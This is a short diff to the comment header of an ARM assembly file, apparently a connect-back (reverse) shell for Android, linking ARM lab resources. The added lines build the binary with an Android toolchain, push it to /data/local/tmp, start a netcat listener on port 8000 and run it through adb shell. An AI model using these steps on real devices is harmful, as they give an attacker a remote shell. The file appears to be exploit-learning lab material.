@@ -4,8 +4,13 @@
  * https://blahcat.github.io/2017/06/25/qemu-images-to-play-with/
  * https://azeria-labs.com/arm-lab-vm/
  *
- * $ as connectback.s -o connectback.o
- * $ ld connectback.o -o connectback
+ * $ arm-linux-androideabi-as connectback.s -o connectback.o
+ * $ arm-linux-androideabi-ld connectback.o -o connectback
+ * $ push connectback /data/local/tmp
+ * $ nc -l 8000
+ * $ (another window) 
+ * $ adb shell
+ * $ /data/local/tmp/connectback
  */
 .section .text
 .global _start
